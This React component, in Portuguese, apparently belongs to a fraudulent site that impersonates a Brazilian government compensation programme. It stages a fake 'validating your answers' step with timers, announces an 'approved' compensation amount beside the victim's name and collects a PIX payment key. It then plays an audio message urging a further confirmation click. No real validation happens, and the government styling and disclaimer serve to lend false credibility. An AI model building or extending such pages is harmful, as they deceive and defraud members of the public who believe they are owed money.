
import React, { useState } from 'react';
import { UserData } from '@/data/userData';
import { formatCPF } from '@/lib/formatCPF';

interface PixRegistrationProps {
  userData: UserData;
  onComplete: (pixType: string, pixKey: string) => void;
}

const PixRegistration: React.FC<PixRegistrationProps> = ({ userData, onComplete }) => {
  const [validating, setValidating] = useState(false);
  const [validated, setValidated] = useState(false);
  const [showPixForm, setShowPixForm] = useState(false);
  const [pixType, setPixType] = useState<string>('CPF');
  const [pixKey, setPixKey] = useState<string>('');
  const [showConfirmation, setShowConfirmation] = useState(false);
  const [pixCompleted, setPixCompleted] = useState(false);
  
  const handleValidation = () => {
    setValidating(true);
    setTimeout(() => {
      setValidating(false);
      setValidated(true);
      setTimeout(() => {
        setShowPixForm(true);
      }, 1500);
    }, 2000);
  };
  
  const handlePixTypeChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    setPixType(e.target.value);
    
    // Set default value based on type
    if (e.target.value === 'CPF') {
      setPixKey(userData.cpf);
    } else {
      setPixKey('');
    }
  };
  
  const handlePixKeyChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPixKey(e.target.value);
  };
  
  const handleSubmitPix = (e: React.FormEvent) => {
    e.preventDefault();
    setShowConfirmation(true);
  };
  
  const handleConfirmPix = () => {
    setShowConfirmation(false);
    setPixCompleted(true);
    
    setTimeout(() => {
      onComplete(pixType, pixKey);
    }, 2000);
  };
  
  const handleCorrectPix = () => {
    setShowConfirmation(false);
  };
  
  return (
    <div className="bg-white rounded-lg p-6 shadow-lg w-full max-w-lg">
      {!validated && (
        <div className="mb-6">
          <div className="flex items-center justify-center mb-4">
            {validating ? (
              <div className="flex items-center">
                <div className="loading-spinner mr-3"></div>
                <span className="text-lg font-semibold">Validando suas respostas...</span>
              </div>
            ) : (
              <button 
                className="gov-button"
                onClick={handleValidation}
              >
                VALIDAR RESPOSTAS
              </button>
            )}
          </div>
        </div>
      )}
      
      {validated && !showPixForm && (
        <div className="mb-6 animate-fade-in">
          <div className="flex items-center justify-center mb-4 text-govGreen">
            <svg 
              className="w-10 h-10 mr-2" 
              fill="none" 
              stroke="currentColor" 
              viewBox="0 0 24 24"
            >
              <path 
                strokeLinecap="round" 
                strokeLinejoin="round" 
                strokeWidth="2" 
                d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" 
              />
            </svg>
            <span className="text-xl font-bold">Respostas Verificadas</span>
          </div>
          <p className="text-center font-semibold mb-4">
            {userData.name}
          </p>
        </div>
      )}
      
      {showPixForm && !pixCompleted && (
        <div className="animate-fade-in">
          <h2 className="text-xl font-bold text-center text-govGreen mb-6">
            Indenização Aprovada
          </h2>
          
          <div className="bg-govGray rounded-lg p-4 mb-6">
            <p className="font-semibold mb-2">Valor Disponível:</p>
            <p className="text-2xl font-bold text-govGreen">
              {userData.compensation.toLocaleString('pt-BR', { 
                style: 'currency', 
                currency: 'BRL' 
              })}
            </p>
          </div>
          
          <form onSubmit={handleSubmitPix}>
            <div className="mb-4">
              <label htmlFor="pixType" className="block text-sm font-semibold mb-2">
                Tipo de Chave PIX
              </label>
              <select
                id="pixType"
                value={pixType}
                onChange={handlePixTypeChange}
                className="gov-input"
                required
              >
                <option value="CPF">CPF</option>
                <option value="EMAIL">E-mail</option>
                <option value="CELULAR">Celular</option>
              </select>
            </div>
            
            <div className="mb-6">
              <label htmlFor="pixKey" className="block text-sm font-semibold mb-2">
                Chave PIX
              </label>
              <input
                id="pixKey"
                type="text"
                value={pixKey}
                onChange={handlePixKeyChange}
                className="gov-input"
                placeholder={pixType === 'CPF' ? '000.000.000-00' : 
                            pixType === 'EMAIL' ? 'exemplo@email.com' : 
                            '(99) 99999-9999'}
                required
              />
            </div>
            
            <button 
              type="submit" 
              className="gov-button w-full"
            >
              CADASTRAR CHAVE PIX
            </button>
          </form>
        </div>
      )}
      
      {showConfirmation && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg p-6 max-w-md mx-4">
            <div className="flex items-center text-govYellow mb-4">
              <svg 
                className="w-10 h-10 mr-2" 
                fill="none" 
                stroke="currentColor" 
                viewBox="0 0 24 24"
              >
                <path 
                  strokeLinecap="round" 
                  strokeLinejoin="round" 
                  strokeWidth="2" 
                  d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" 
                />
              </svg>
              <span className="text-xl font-bold text-govDarkBlue">Confirme sua Chave PIX</span>
            </div>
            
            <div className="mb-6">
              <p className="mb-4">
                <span className="font-semibold">Tipo:</span> {pixType}
              </p>
              <p className="mb-4">
                <span className="font-semibold">Chave:</span> {pixType === 'CPF' ? formatCPF(pixKey) : pixKey}
              </p>
              <p className="text-sm text-govDarkGray mb-4">
                O governo não se responsabiliza por erros na inserção da chave PIX. 
                Certifique-se de que a chave está correta para receber sua indenização.
              </p>
            </div>
            
            <div className="flex flex-col sm:flex-row gap-3">
              <button 
                className="gov-button-success flex-1"
                onClick={handleConfirmPix}
              >
                SIM, ESTÁ CORRETO
              </button>
              <button 
                className="gov-button-secondary flex-1"
                onClick={handleCorrectPix}
              >
                NÃO, DESEJO CORRIGIR
              </button>
            </div>
          </div>
        </div>
      )}
      
      {pixCompleted && (
        <div className="animate-fade-in">
          <div className="flex items-center justify-center mb-6 text-govGreen">
            <svg 
              className="w-10 h-10 mr-2" 
              fill="none" 
              stroke="currentColor" 
              viewBox="0 0 24 24"
            >
              <path 
                strokeLinecap="round" 
                strokeLinejoin="round" 
                strokeWidth="2" 
                d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" 
              />
            </svg>
            <span className="text-xl font-bold">Chave PIX Cadastrada</span>
          </div>
          
          <div className="bg-govGray rounded-lg p-4 mb-6">
            <div className="space-y-2">
              <p><span className="font-semibold">Nome:</span> {userData.name}</p>
              <p><span className="font-semibold">Chave PIX:</span> {pixType === 'CPF' ? formatCPF(pixKey) : pixKey}</p>
              <p><span className="font-semibold">Status:</span> <span className="text-govGreen font-bold">Aprovado</span></p>
            </div>
          </div>
          
          <div className="mb-6">
            <div className="flex items-center mb-2">
              <svg 
                className="w-5 h-5 mr-2 text-govBlue" 
                fill="none" 
                stroke="currentColor" 
                viewBox="0 0 24 24"
              >
                <path 
                  strokeLinecap="round" 
                  strokeLinejoin="round" 
                  strokeWidth="2" 
                  d="M9 19V6l12-3v13M9 19c0 1.105-1.343 2-3 2s-3-.895-3-2 1.343-2 3-2 3 .895 3 2zm12-3c0 1.105-1.343 2-3 2s-3-.895-3-2 1.343-2 3-2 3 .895 3 2zM9 10l12-3" 
                />
              </svg>
              <span className="text-sm font-semibold">Mensagem de áudio recebida</span>
            </div>
            <audio 
              controls
              className="w-full mb-4 h-10"
            >
              <source src="/audio-message.mp3" type="audio/mp3" />
              Seu navegador não suporta áudio.
            </audio>
            <p className="text-sm text-govDarkGray italic">
              "Clique no botão abaixo para confirmar e liberar o envio da sua indenização..."
            </p>
          </div>
          
          <button 
            className="gov-button-success w-full"
            onClick={() => onComplete(pixType, pixKey)}
          >
            DESEJO RECEBER MEU COMPROVANTE DE RECEBIMENTO
          </button>
        </div>
      )}
    </div>
  );
};

export default PixRegistration;
